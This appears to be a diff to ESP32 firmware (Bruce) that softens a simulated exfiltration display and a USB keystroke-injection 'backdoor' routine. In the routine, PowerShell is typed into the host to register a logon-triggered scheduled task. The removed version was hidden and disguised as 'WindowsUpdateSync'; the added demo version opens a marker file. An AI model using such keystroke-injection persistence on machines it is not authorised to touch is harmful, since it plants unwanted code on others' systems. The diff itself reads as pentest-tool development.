@@ -295,12 +295,13 @@ void ledBlinkExfilChannel() {
         wakeUpScreen();
         if (check(EscPress) || returnToMenu) return;
 
-        if(random(0, 100) > 98) { // Simulate receiving a byte
+        if(random(0, 100) > 90) { // Simulate receiving a byte
+            uint8_t val = random(0, 255);
             tft.setTextColor(TFT_GREEN);
-            tft.print(random(0, 9));
+            tft.printf(" [%02X] ", val);
             tft.setTextColor(bruceConfig.priColor);
         }
-        delay(100);
+        delay(200);
     }
 }
 
@@ -417,16 +418,17 @@ void persistentHidBackdoor() {
 
     openPowershell();
 
-    // Powershell script to schedule a task that runs invisible
-    String psTarget = "$A = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-WindowStyle Hidden -Command \"calc.exe\"';"
+    // Powershell script to schedule a task that runs invisible - Educational demo
+    String psTarget = "$A = New-ScheduledTaskAction -Execute 'notepad.exe' -Argument 'C:\\Users\\Public\\BRUCE_WAS_HERE.txt';"
                       "$T = New-ScheduledTaskTrigger -AtLogOn;"
-                      "Register-ScheduledTask -TaskName 'WindowsUpdateSync' -Action $A -Trigger $T -Force";
+                      "Register-ScheduledTask -TaskName 'BruceSecurityDemo' -Action $A -Trigger $T -Force;"
+                      "Set-Content -Path 'C:\\Users\\Public\\BRUCE_WAS_HERE.txt' -Value 'DEMO: Esta tarefa foi agendada pelo Bruce ESP32 para fins educativos.'";
 
     sendString(psTarget.c_str());
     usbKeyboard.press(KEY_RETURN);
     usbKeyboard.releaseAll();
 
-    padprintln("Persistencia via Scheduled Task!");
+    padprintln("Demonstracao de persistencia instalada.");
     delay(2000);
 }
 
